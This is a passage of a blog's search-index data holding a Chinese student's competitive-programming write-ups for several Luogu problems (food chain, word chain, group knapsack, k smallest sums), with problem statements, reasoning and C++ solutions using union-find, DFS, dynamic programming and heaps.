fromN;}edge[2 * M]; void Equip(int x, int y) { km++; edge[km].nextE = h[x]; edge[km].toN = y; h[x] = km; edge[km].fromN = x; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); int a, b; for(int i = 0; i &lt; n; i++) father[i] = i; for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d&quot;, &amp;a, &amp;b); Equip(a, b); Equip(b, a); } scanf(&quot;%d&quot;, &amp;k); for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d&quot;, &amp;a); arrayK[i] = a; del[a] = true; } /* 当然初始化也有两种思路 * 遍历点，如果星球不会被毁灭，则搜索与之相连的边，如果连接到的星球也不会被毁灭，则合并集合 * 事实证明，这种方法的效率更快 */ for(int i = 0; i &lt; n; i++) { if(!del[i]) { current++; for(int t = h[i]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(i, edge[t].toN)) { Union(i, edge[t].toN); current--; } } } } // 遍历边，如果两边的星球都不会被毁灭，则合并两星球 /* current = n - k; for(int i = 1; i &lt;= 2 * m; i++) { if(!del[edge[i].fromN] &amp;&amp; !del[edge[i].toN] &amp;&amp; !Judge(edge[i].fromN, edge[i].toN)) { current--; Union(edge[i].fromN, edge[i].toN); } }*/ ans[k] = current; for(int i = k; i &gt;= 1; i--) { current++; del[arrayK[i]] = false; for(int t = h[arrayK[i]]; t; t = edge[t].nextE) { if(!del[edge[t].toN] &amp;&amp; !Judge(arrayK[i], edge[t].toN)) { Union(arrayK[i], edge[t].toN); current--; } } ans[i - 1] = current; } for(int i = 0; i &lt;= k; i++) printf(&quot;%d\\n&quot;, ans[i]); } 后续说起来你可能不信，我调了半个下午最后才发现我并查集路径压缩写错了","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"}]},{"title":"Question-P2024","date":"2020-02-08T07:19:10.000Z","path":"2020/02/08/coding/questions/Question-P2024/","text":"P2024 [NOI2001]食物链题目描述动物王国中有三类动物 A,B,C，这三类动物的食物链构成了有趣的环形。A 吃 B，B 吃 C，C 吃 A。 现有 N 个动物，以 1 － N 编号。每个动物都是 A,B,C 中的一种，但是我们并不知道 它到底是哪一种。 有人用两种说法对这 N 个动物所构成的食物链关系进行描述： 第一种说法是“1 X Y”，表示 X 和 Y 是同类。 第二种说法是“2 X Y”，表示 X 吃 Y 。 此人对 N 个动物，用上述两种说法，一句接一句地说出 K 句话，这 K 句话有的是真 的，有的是假的。当一句话满足下列三条之一时，这句话就是假话，否则就是真话。 • 当前的话与前面的某些真的话冲突，就是假话 • 当前的话中 X 或 Y 比 N 大，就是假话 • 当前的话表示 X 吃 X，就是假话 你的任务是根据给定的 N 和 K 句话，输出假话的总数。 输入格式从 eat.in 中输入数据 第一行两个整数，N，K，表示有 N 个动物，K 句话。 第二行开始每行一句话（按照题目要求，见样例） 输出格式输出到 eat.out 中 一行，一个整数，表示假话的总数。 输入输出样例输入 #1100 7 1 101 1 2 1 2 2 2 3 2 3 3 1 1 3 2 3 1 1 5 5输出 #13说明/提示1 ≤ N ≤ 5 ∗ 10^4 1 ≤ K ≤ 10^5 音乐 解首先，所有动物都可以被分为三类，或者说三个集合，可以考虑用并查集处理 这三个集合之间还有逻辑关系存在，是一个环形的食物链，我们可以直接想到用环形的链表去模拟，链表的节点就是并查集的祖宗， 为了简便，我们称中间的链表的上行为父，下行为子 之后有k句话，非假即真，我们需要先判断话语是否为假，不为假就是真的，即存储这个事实 之后需要考虑的东西： 如何去维护一个环形的链表？ 如何去判断这一句话是否为假？ 问题 #1首先考虑维护一个链表的连通性 在一个链表的 节点数&lt;3 时，使其不闭合，而当其 节点数=3 时，使其闭合，当 节点数&gt;3 时，使闭合链表的同时合并集合，将 第k节点 与 第k+3节点 合并 当两个链表合成的时候，我们需要对其中的集合进行合并，同时也要注意到需要维护 节点是祖宗 的性质 更具体的，输入 1 x y 时，在判断不为假之后，我们对两个链表合并，我们将左链表节点代表的集合的祖宗视为合并后节点上的代表祖宗，如果左链表无父/子，则补上右链表的节点代表的集合的祖宗为合并后节点上的代表祖宗，之后判断连通性即可(换句话说，有左边就左边为祖宗，左边没有就用右边) 输入 2 x y时，在判断不为假之后，我们对两个链表错位合并，如果左链表的节点有子，则执行1 x.son y，如果左链表的节点无子， 右链表的节点有父，则执行1 x y.fat,当左无子，右无父之后，合并右子与左父(如果都有的话)，之后直接使得左为右父，右为左子，判断连通性即可 问题 #2判断一句话是否为假，我们直接找出值在集合中的祖宗，在对应链表上查找即可 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define K 100500 #define N 60050 using namespace std; int n, k, father[N]; //并查集素质三连 inline int Find(int x) { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } inline void Union(int x, int y) { father[Find(y)] = Find(father[x]); } inline bool Judge(int x, int y) { return Find(x) == Find(y); } //链表 struct Link { int f, s; }l[N]; //判断连通性 inline void Connect(int xRoot)//BUG: ³É»·Ö®ºó»¹ÐèÒªÖ´ÐÐÒ»±éÎÞÒâÒåµÄ { if(l[xRoot].s != xRoot &amp;&amp; l[l[xRoot].s].s != l[xRoot].s) { l[xRoot].f = l[l[xRoot].s].s; l[l[l[xRoot].s].s].s = xRoot; } else if(l[xRoot].f != xRoot &amp;&amp; l[xRoot].s != xRoot) { l[l[xRoot].f].f = l[xRoot].s; l[l[xRoot].s].s = l[xRoot].f; } else if(l[xRoot].f != xRoot &amp;&amp; l[l[xRoot].f].f != l[xRoot].f) { l[xRoot].s = l[l[xRoot].f].f; l[l[l[xRoot].f].f].f = xRoot; } } //合并两个链表 inline void UnionLink(int x, int y) { int xRoot = Find(x), yRoot = Find(y); if(xRoot == yRoot) return; if(l[yRoot].f != yRoot) { if(l[xRoot].f != xRoot) Union(l[xRoot].f, l[yRoot].f); else { l[xRoot].f = l[yRoot].f; l[l[xRoot].f].s = xRoot; } } if(l[yRoot].s != yRoot) { if(l[xRoot].s != xRoot) Union(l[xRoot].s, l[yRoot].s); else { l[xRoot].s = l[yRoot].s; l[l[xRoot].s].f = xRoot; } } Union(xRoot, yRoot); l[l[xRoot].s].s = l[xRoot].s; l[l[xRoot].f].f = l[xRoot].f; Connect(xRoot); } //判断是否相等(处于同一个集合) inline bool Equal(int x, int y) { x = Find(x); y = Find(y); bool res = true; if(l[x].f == y || l[x].f == l[y].s) res = false; else if(x == l[y].f || x == l[y].s) res = false; else if(l[x].s == l[y].f || l[x].s == y) res = false; if(res) { UnionLink(x, y); return true; } else return false; } //判断是否为捕食关系(处于链表上的两个父子关系集合) inline bool BeEaten(int x, int y) { x = Find(x); y = Find(y); if(l[x].s == y) return true; if(l[y].f != y) { if(Equal(x, l[y].f)) return true; else return false; } else if(l[x].s != x) { if(Equal(l[x].s, y)) return true; else return false; } else { l[x].s = y; l[y].f = x; if(l[y].s != y) { if(l[x].f != x) Union(l[x].f, l[y].s); else { l[x].f = l[y].s; l[l[y].s].s = x; } } l[l[x].s].s = l[x].s; l[l[x].f].f = l[x].f; Connect(x); return true; } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for(int i = 1; i &lt;= n; i++) father[i] = l[i].f = l[i].s = i; int j, x, y, sum = 0; for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d%d%d&quot;, &amp;j, &amp;x, &amp;y); if(j == 1) { if(x &gt; n || y &gt; n)sum++; else if(x != y &amp;&amp; !Equal(x, y)) sum++; } else if(j == 2) { if(x &gt; n || y &gt; n)sum++; else if(x == y)sum++; else if(!BeEaten(x, y)) sum++; } } printf(&quot;%d\\n&quot;, sum); }后话好久没更新了鸭！关键是沉迷于各种游戏和做游戏无法自拔，忘了懒得写题了QAQ 总之今后会一点一点慢慢来的！奥利给","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"链表","slug":"链表","permalink":"https://v25bh145.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"Question-P2502","date":"2020-01-11T01:24:52.000Z","path":"2020/01/11/coding/questions/Question-P2502/","text":"P2502题目描述Z小镇是一个景色宜人的地方，吸引来自各地的观光客来此旅游观光。Z小镇附近共有N个景点（编号为1,2,3,…,N），这些景点被M条道路连接着，所有道路都是双向的，两个景点之间可能有多条道路。也许是为了保护该地的旅游资源，Z小镇有个奇怪的规定，就是对于一条给定的公路Ri，任何在该公路上行驶的车辆速度必须为Vi。速度变化太快使得游客们很不舒服，因此从一个景点前往另一个景点的时候，大家都希望选择行使过程中最大速度和最小速度的比尽可能小的路线，也就是所谓最舒适的路线。 输入格式第一行包含两个正整数，N和M。 接下来的M行每行包含三个正整数：x，y和v。表示景点x到景点y之间有一条双向公路，车辆必须以速度v在该公路上行驶。 最后一行包含两个正整数s，t，表示想知道从景点s到景点t最大最小速度比最小的路径。s和t不可能相同。 输出格式如果景点s到景点t没有路径，输出“IMPOSSIBLE”。否则输出一个数，表示最小的速度比。如果需要，输出一个既约分数。 输入输出样例输入4 2 1 2 1 3 4 2 1 4输出IMPOSSIBLE输入3 3 1 2 10 1 2 5 2 3 8 1 3输出5/4 输入3 21 2 22 3 41 3 输出2 说明/提示【数据范围】 1&lt;N≤500 1≤x,y≤N，0&lt;v&lt;30000，x≠y 0&lt;M≤5000 听歌儿 解(人在机房，刚被囚禁，闲来无事写写博客，利益相关，匿了匿了) 一看数据范围，N至多500，第一个想到的算法是搜索，其要求的是最大速度/最小速度，(难道要求记录历史的所有速度？？) 所以放弃爆搜廖 之后想到了迪杰的堆优化贪心，(甚至还打了一遍)发现贪心策略不适合这个，因为速度要求的是极差最小，所以这种贪心只拿了30 (居然还拿了30？？) 最后翻了翻题解….emm 可以用类似最小生成树的算法做，先排序一遍，从最大开始，先遍历一遍，再从第一遍遍历的节点向后，一遍循环终止条件是起始点和终止点连接，最后记下最大速度/最小速度的值 (其实就是枚举辣！) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 550 #define M 5500 #define inf 0x7fffffff using namespace std; int n, m, tmp1, tmp2, tmp3, father[N], st, ed; struct Edge { int x, y, v; bool operator &lt; (const Edge a) const { return a.v &lt; v; } }edge[M]; int Find(int x)//并查集 { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } int Union(int x, int y) { father[Find(x)] = Find(father[y]); } bool Judge(int x, int y) { if(Find(x) == Find(y)) return true; else return false; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d%d&quot;, &amp;tmp1, &amp;tmp2, &amp;tmp3); edge[i].x = tmp1; edge[i].y = tmp2; edge[i].v = tmp3; } scanf(&quot;%d%d&quot;, &amp;st, &amp;ed); sort(edge + 1, edge + 1 + m); int Max = inf, Min = 1; for(int i = 1, tmpN; i &lt;= m; i++) { for(int j = 1; j &lt;= n; j++) father[j] = j; for(tmpN = i; tmpN &lt;= m; tmpN++) { Union(edge[tmpN].x, edge[tmpN].y); if(Judge(st, ed)) break; } if(tmpN &lt;= m &amp;&amp; edge[i].v / (double)edge[tmpN].v &lt; Max / (double)Min)//这里记得转换成小数除法比较 { Max = edge[i].v; Min = edge[tmpN].v; } } if(Max == inf) printf(&quot;IMPOSSIBLE\\n&quot;); else { int num = __gcd(Max, Min); if(Min == num) printf(&quot;%d\\n&quot;, Max / num); else printf(&quot;%d/%d\\n&quot;, Max / num, Min / num); } }时间复杂度：O($n^{2}$)最后一个带问题：将重载的运算符换成&gt;=就会出问题，为什么鸭？？？爆了两个WA和一个MLE","tags":[{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"最小生成树","slug":"最小生成树","permalink":"https://v25bh145.github.io/tags/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"}]},{"title":"Question-P1019","date":"2019-12-18T11:44:30.000Z","path":"2019/12/18/coding/questions/Question-P1019/","text":"P1019题目描述单词接龙是一个与我们经常玩的成语接龙相类似的游戏，现在我们已知一组单词，且给定一个开头的字母，要求出以这个字母开头的最长的“龙”（每个单词都最多在“龙”中出现两次），在两个单词相连时，其重合部分合为一部分，例如 beastbeast和astonishastonish，如果接成一条龙则变为beastonishbeastonish，另外相邻的两部分不能存在包含关系，例如atat 和 atideatide 间不能相连。 输入格式输入的第一行为一个单独的整数n (n≤20)表示单词数，以下n 行每行有一个单词，输入的最后一行为一个单个字符，表示“龙”开头的字母。你可以假定以此字母开头的“龙”一定存在. 输出格式只需输出以此字母开头的最长的“龙”的长度 输入输出样例输入 #15 at touch cheat choose tact a输出 #123说明/提示（连成的“龙”为atoucheatactactouchoose） NOIp2000提高组第三题 听歌儿 MC大法好 解康康数据规模，这题就是暴力枚举/线性的深度优先搜索 这样枚举(套用DFS模板即可)： Enum(last: int) 从1至nif 位置为i的单词尚未超过使用限额 且 位置为i的单词头部可以和上一个使用的单词尾部连接则 连接上此单词 将此单词标记为使用一次 递归Enum(i) 将此单词标记为取消使用一次 取消连接此单词继续循环 难点在于连接与取消连接 连接（融♂合）顺序遍历一遍字符串和接龙，计算他们最小重叠的长度 例如， C#nb 和 nb 的最小重叠长度就是2 如果最小重叠长度等于其中一个字符串的长度(也就是说覆盖辣)，这肯定是不行的鸭 之后进行连接操作，从重叠的那里连接就完事儿了 取消连接这个函数必须要传入三个值啊，接龙，上个连接的单词和这个连接的单词 我们需要算出两个单词的最小重叠长度，之后再使接龙部分减去这个单词没有重叠的部分 例如，hiahiahiahiahiahiahhh, hiahiahia, hiahhh 就必须算出最小重叠长度，之后使接龙减去没有重叠的部分就可以了 杂项的操作比如程序要求第一个开头固定，那我们就将接龙初始化为那个开头字母，之后第一次枚举的时候传入last = 0表示没有上一个单词的，然后在连接和取消连接的那里做一个spj(special judge) 代码#include &lt;iostream&gt; #include &lt;string&gt; #include &lt;cstring&gt; using namespace std; string words[22], sentence; char start; int n, MAX = 0; int isUsed[22]; void CancelConnect(int position, int last) { string tmp = words[position]; if(last == 0) { sentence = string(sentence.begin(), sentence.end() - tmp.length()); return; } string sLast = words[last]; int length = min(sLast.length(), tmp.length()); int radix = 0; for(int i = 0; i &lt; length; i++) { string s1 = string(sLast.end() - i, sLast.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } sentence = string(sentence.begin(), sentence.end() - tmp.length() + radix); } bool Connect(int position, int last) { string tmp = words[position]; int radix = 0; int length = min(sentence.length(), tmp.length()); for(int i = 0; i &lt;= length - 1; i++) { string s1 = string(sentence.end() - i, sentence.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } if(radix == 0 &amp;&amp; last != 0)//这里就是spj return false; string result = string(tmp.begin() + radix, tmp.end()); sentence = sentence + result; return true; } void Enum(int last) { MAX = MAX &gt; sentence.length() ? MAX : sentence.length(); for(int i = 1; i &lt;= n; i++) if(isUsed[i] &lt;= 1) { string sTmp = words[i]; if(last == 0 &amp;&amp; sTmp[0] != start) continue; if(Connect(i, last) == true) { isUsed[i]++; Enum(i); isUsed[i]--; CancelConnect(i, last); } } } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) isUsed[i] = 0; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;words[i]; cin&gt;&gt;start; sentence = string(1, start); Enum(0); cout&lt;&lt;MAX - 1&lt;&lt;endl; return 0; } 一开始太菜算成了最大重叠长度 写博客有点晚了，现在逐渐开始习惯输入进去C字符串scanf(%s, c);然后string s = string(c)了2333","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"https://v25bh145.github.io/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1280","date":"2019-12-11T14:23:59.000Z","path":"2019/12/11/coding/questions/Question-P1280/","text":"P1280题目描述尼克每天上班之前都连接上英特网，接收他的上司发来的邮件，这些邮件包含了尼克主管的部门当天要完成的全部任务，每个任务由一个开始时刻与一个持续时间构成。 尼克的一个工作日为N分钟，从第一分钟开始到第N分钟结束。当尼克到达单位后他就开始干活。如果在同一时刻有多个任务需要完成，尼克可以任选其中的一个来做，而其余的则由他的同事完成，反之如果只有一个任务，则该任务必需由尼克去完成，假如某些任务开始时刻尼克正在工作，则这些任务也由尼克的同事完成。如果某任务于第P分钟开始，持续时间为T分钟，则该任务将在第P+T-1分钟结束。 写一个程序计算尼克应该如何选取任务，才能获得最大的空暇时间。 输入格式输入数据第一行含两个用空格隔开的整数N和K(1≤N≤10000，1≤K≤10000)，N表示尼克的工作时间，单位为分钟，K表示任务总数。 接下来共有K行，每一行有两个用空格隔开的整数P和T，表示该任务从第P分钟开始，持续时间为T分钟，其中1≤P≤N，1≤P+T-1≤N。 输出格式输出文件仅一行，包含一个整数，表示尼克可能获得的最大空暇时间。 输入输出样例输入 #115 6 1 2 1 6 4 11 8 5 8 1 11 5输出 #14 听音乐 炒鸡柔和的诶 (不愧是近月少女哈哈哈哈) 解资源分配型的DP问题 我们的资源是时间与工作，这里先模拟一下情况： (手绘好丑) 这里选择的最优解是第二条和第四条，第二条规避了第一条和第三条，第四条规避了第五条和第六条 这里我们可以再转变一下表示类型，变成有向图 是不是很清楚了？ f[i] = (f[i节点的前接节点j] + w[i][j] , f[i]) 怎么初始化呢？首先我们要对起始时间排序 只设置入度为零的点为初始化点，即起始时间最短的点，赋值为起始时间，考虑这样的点有多个，需要循环 之后默认每个点都不可达，为无穷小 怎么判断一个节点j是否是另外一个节点i的前接节点呢具有两条性质： j的终止时间在i的终止时间前面 没有任何一个节点的起始时间在 j的终止时间到i的起始时间的时间段内 1是2的特殊化 第二条怎么实现呢？ 倒序遍历i前的所有节点，设第一个与i起始值不一样的节点k，k节点的起始值就是判断的标准，且k节点一定为i节点的前接节点 *证明 k节点一定是i节点的前接节点 反证：若k节点不是i节点的前接节点，则一定有一个节点u的起始值在i的起始值之前k的末尾值之后，又知1~i-1的节点中k节点的起始值离i最近，所以这样的u不存在 k节点的起始值是判断的标准，若有u节点在k节点起始值至i节点起始值之间，则u是i的前接节点 反证：若u节点不是i的前接节点，则一定有一个节点v的起始值在u的末尾与i的起始之间，又知1~i-1的节点中k节点的起始值离i最近，所以这样的v不存在 上代码扒 #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; int N, K, f[10050], jud[10050]; struct Node { int start; int end; }a[10050]; bool cmp(Node x, Node y) { if(x.start &lt; y.start) return true; else return false; } int main() { cin&gt;&gt;N&gt;&gt;K; int tmp; for(int i = 1; i &lt;= K; i++) { cin&gt;&gt;a[i].start&gt;&gt;tmp; a[i].end = a[i].start + tmp - 1; } //系统排序，以起始时间升序 sort(a + 1, a + 1 + K, cmp); //初始化不可达点与可达点 for(int i = 0; i &lt;= K; i++) f[i] = -1000000; f[1] = a[1].start - 1; int first = 2; while(a[first].start == a[1].start) { f[first] = a[1].start - 1; first++; } int mid, head; for(int i = 2; i &lt;= K; i++) { head = i - 1; //确定判断基准 while(a[head].start == a[i].start) head--; if(head == 0) head = 1; mid = a[head].start; for(int j = i - 1; j &gt;= 1; j--) if(a[j].end &lt; a[i].start &amp;&amp; a[j].end &gt;= mid) //转移方程 f[i] = max(f[i], f[j] + a[i].start - a[j].end - 1); } //对尾部时间操作，以最后一位的起始时间为基准 for(int i = 1; i &lt;= K; i++) if(a[i].end &gt;= a[K].start) f[i] += N - a[i].end; int MAX = f[1]; for(int i = 2; i &lt;= K; i++) MAX = MAX &gt; f[i] ? MAX : f[i]; cout&lt;&lt;MAX&lt;&lt;endl; return 0; } 写在最后这道题花了我一天啊！！！ 一道DP绿题QAQ 当然题的做法也可以DP总时间，我这里DP了工作数量 DP大法好！！ (然鹅我还是不会啊QAQ) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1064","date":"2019-12-09T13:27:22.000Z","path":"2019/12/09/coding/questions/Question-P1064/","text":"P1064题目描述金明今天很开心，家里购置的新房就要领钥匙了，新房里有一间金明自己专用的很宽敞的房间。更让他高兴的是，妈妈昨天对他说：“你的房间需要购买哪些物品，怎么布置，你说了算，只要不超过NN元钱就行”。今天一早，金明就开始做预算了，他把想买的物品分为两类：主件与附件，附件是从属于某个主件的，下表就是一些主件与附件的例子： 主件 附件 电脑 打印机，扫描仪 书柜 图书 书桌 台灯，文具 工作椅 无 如果要买归类为附件的物品，必须先买该附件所属的主件。每个主件可以有0个、1个或2个附件。附件不再有从属于自己的附件。金明想买的东西很多，肯定会超过妈妈限定的N元。于是，他把每件物品规定了一个重要度，分为5等：用整数1-5表示，第5等最重要。他还从因特网上查到了每件物品的价格（都是10元的整数倍）。他希望在不超过N元（可以等于N元）的前提下，使每件物品的价格与重要度的乘积的总和最大。 设第j件物品的价格为v[j]，重要度为w[j]，共选中了k件物品，编号依次为 $j_{1},j_{2},……,j_{k}$ ，则所求的总和为： v[j1] * w[j1] + v[j2] * w[j2] + …… ＋ v[jk] * w[jk] 请你帮助金明设计一个满足要求的购物单。 输入格式第1行，为两个正整数，用一个空格隔开： N m （其中N(&lt;32000)表示总钱数，m(&lt;60)为希望购买物品的个数。） 从第2行到第m+1行，第j行给出了编号为j-1的物品的基本数据，每行有3个非负整数 v p q （其中v表示该物品的价格（v&lt;10000），p表示该物品的重要度（1-5），q表示该物品是主件还是附件。如果q=0，表示该物品为主件，如果q&gt;0，表示该物品为附件，q是所属主件的编号） 输出格式一个正整数，为不超过总钱数的物品的价格与重要度乘积的总和的最大值（&lt;200000）。 输入输出样例输入1000 5 800 2 0 400 5 1 300 5 1 400 3 0 500 2 0输出2200说明/提示NOIP 2006 提高组 第二题 听音乐~ 解首先这道题是一个0-1型背包问题，不过加了一层限制，如果想选择附件则必须要先选择对应的主件 首先考虑n呈10的整数倍，可以将空间缩小10倍，返回的解*10 考虑分组背包，每一个组包含主件和主件的附属，矛盾的选择是主件和不同附件的排列组合这样的时间复杂度是指数级了，每一个附件有选择或不选择两种状态 考虑优化，对每一个组内部进行0-1背包处理，计算不同体积下能获得的最大价格，矛盾的选择是在选择在此组消耗的体积 最后考虑关于动态规划的数组在空间上的优化，0-1背包问题使用一维数组存储单个组解，放在分组问题中组循环的内部，分组问题使用一维数组刷新的方式 代码#include &lt;iostream&gt; using namespace std; int N, m, groupOptimal[3250], optimal[3250]; int mGroup = 0; struct Group { int value; int cost; int sonValue[62]; int sonCost[62]; int length; } k[62]; int main() { cin&gt;&gt;N&gt;&gt;m; N = N / 10; for(int i = 0; i &lt;= m; i++) { //初始化操作,-1代表不存在 k[i].value = -1; k[i].length = 0; } int tmpValue, tmpPrior, tmpOf; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmpValue&gt;&gt;tmpPrior&gt;&gt;tmpOf; if(tmpOf == 0) { k[i].value = tmpValue * tmpPrior / 10; k[i].cost = tmpValue / 10; } else { k[tmpOf].length++; k[tmpOf].sonValue[k[tmpOf].length] = tmpValue * tmpPrior / 10; k[tmpOf].sonCost[k[tmpOf].length] = tmpValue / 10; } } for(int i = 1; i &lt;= m; i++) if(k[i].value != -1) //若组存在，则组的数目自增1 { mGroup++; swap(k[mGroup], k[i]); } for(int i = 1; i &lt;= mGroup; i++) //动态规划数组初始化，放入主件 { for(int j = 0; j &lt;= N; j++) { if(j &gt;= k[i].cost) groupOptimal[j] = k[i].value; else groupOptimal[j] = -100000000; } for(int v = 1; v &lt;= k[i].length; v++) for(int j = N; j &gt;= k[i].cost; j--) if(j - k[i].sonCost[v] &gt;= 0) groupOptimal[j] = max(groupOptimal[j], groupOptimal[j - k[i].sonCost[v]] + k[i].sonValue[v]); for(int j = N; j &gt;= 0; j--) for(int u = j; u &gt;= k[i].cost; u--) optimal[j] = max(optimal[j], optimal[j - u] + groupOptimal[u]); } cout&lt;&lt;optimal[N] * 10&lt;&lt;endl; return 0; } 复杂度：$O(m^{2}N + mN^{2})$绰绰有余辣 写在最后有没有感觉篇博客明显变短了鸭哈哈哈 我感觉我太啰嗦了，而且一般写的思考过程和试错鸭什么的辣些一般我也不会怎么看的hhhh 最近在复习 (从0基础开始学) 动态规划呢，感觉好难鸭哈哈哈 最大的问题就是转移方程的推导了嗯嗯，没看见这个转移方程的时候我根本推不出来哈哈哈 (难道是我题解看多了) 加油扒~顺便背包九讲的东东我打算往笔记本里记廖，这里就不复述辣","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1631","date":"2019-12-04T08:12:07.000Z","path":"2019/12/04/coding/questions/Question-P1631/","text":"P1631题目描述有两个长度都是N的序列A和B，在A和B中各取一个数相加可以得到$N^{2}$个和，求这$N^{2}$个和中最小的N个。 输入格式第一行一个正整数N； 第二行N个整数$A_{i}$, 满足$A_{i}$ &lt;= $A_{i+1}$且 $A_{i}$ ≤$10^{9}$; 第三行N个整数$B_{i}$, 满足$B_{i}$ &lt;= $B_{i+1}$且 $B_{i}$ ≤$10^{9}$. 【数据规模】对于50%的数据中，满足1&lt;=N&lt;=1000； 对于100%的数据中，满足1&lt;=N&lt;=100000。 输出格式输出仅一行，包含N个整数，从小到大输出这N个最小的和，相邻数字之间用空格隔开。 输入输出样例输入 #1 3 2 6 6 1 4 8输出 #1 3 6 7 听音乐~ 解这个题真的不难，但是非常的具有代表性QAQ 下面这个题用这个题的模板做，改改value的计算方式就AC了…… 链接：P2085 所以还不多康康这种题？！！ introa和b是以升序排布的嘛 (这一点我一开始居然没有看出来！QAQ我个瞎子) 然后求的是 a + b 的前几个最小值 从数据范围看出来要的是O(nlgn) 暴力暴力做法，那就是申个二维数组挨个算 不仅从时间上(O($n^{2}$))超了，空间也超了 在第n个小的求和之外所花费的时间和空间全部多余了 研究如何使得多余的计算被避免掉，那就需要从暴力做法还没有讨论到的特殊性质出发辣 暴力做法二维数组的性质那我们先打个表出来 横行是a数组，纵行是b数组 a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 很明显，最小的数字应该从左上往右下取得 还有一个性质： 如果要取(i,j)，必须要保证(i,j-1)与(i-1,j)被取得 因为(i,j-1)与(i-1,j)都比(i,j)要小 反映到图上，由于这是一条可以递归的性质，图要求这个节点的左上所构成的矩形全部被取到 然后还有个最基础的性质，(1,1)一定会被取到 那么就可以从(1,1)开始，先打印(1,1) 判断出(1,2)与(2,1)都符合比较的规则 然后比较(1,2)与(2,1) 按照图来，打印(2,1) 判断(3,1)符合规则，(2,2)由于(1,2)还没有被取到，不符合规则 比较(3,1)与(1,2) …… 注意到前面的比较被淘汰的仍然参与下一次比较 每一次比较只选出最小的值 想到了什么？？堆！ 接下来还有两个问题需要讨论： 如何判断是否符合规则 如何比较堆的值(&gt; &lt; =) 1. 如何判断是否符合规则即是判断二维数组左上角的矩形中有没有没被选择上的数字 考虑到如果(i,j)被选择到了，那么(i,j)左上角的矩形都被选择到了 所以要看(i + 1, j + 1)左上方是否有空，就是看其左方的数字的左上方是否有空，上方的数字的左上方是否有空，也就是看左方的数字是否为空，上方的数字是否为空 这不是让你递归啊=-= 就是把(i + 1,j + 1)的判断转移到了(i,j+1)与(i+1,j)上 以左边为例 判断左边是否为空，第一想到的就是设置一个矩阵……超空间了 然后依据最小的性质，可以比较左边和刚刚输出的数字，如果小就是已经输出过了 –如果左边的数字和刚刚输出的数字相等呢？那我们可以做一个规定，默认堆排序的时候在 值大小 的优先级之下比较谁更靠左 这样也解决了问题2. 代码#include &lt;iostream&gt; using namespace std; int a[105000], b[105000], n, length = 0; struct Node { int value; int left; int right; }heap[105000]; void SwapHeap(int p1, int p2) { swap(heap[p1].left, heap[p2].left); swap(heap[p1].right, heap[p2].right); swap(heap[p1].value, heap[p2].value); } void HeapifyFromDownToUp(int k) { if(k &gt; 1) { int parent = k / 2; if(heap[parent].value &gt; heap[k].value) { SwapHeap(parent, k); HeapifyFromDownToUp(parent); } else if(heap[parent].value == heap[k].value &amp;&amp; heap[parent].right &gt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(parent, k) ; HeapifyFromDownToUp(parent); } } } void HeapifyFromUpToDown(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1; int lChild = k * 2; int minChild; if(rChild &gt; length) minChild = lChild; else { if(heap[rChild].value &lt; heap[lChild].value) minChild = rChild; else if(heap[rChild].value &gt; heap[lChild].value) minChild = lChild; else if(heap[rChild].value == heap[lChild].value) { minChild = heap[lChild].right &lt;= heap[rChild].right ? lChild : rChild; } } if(heap[minChild].value &lt; heap[k].value) { SwapHeap(minChild, k); HeapifyFromUpToDown(minChild); } else if(heap[minChild].value == heap[k].value &amp;&amp; heap[minChild].right &lt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(minChild, 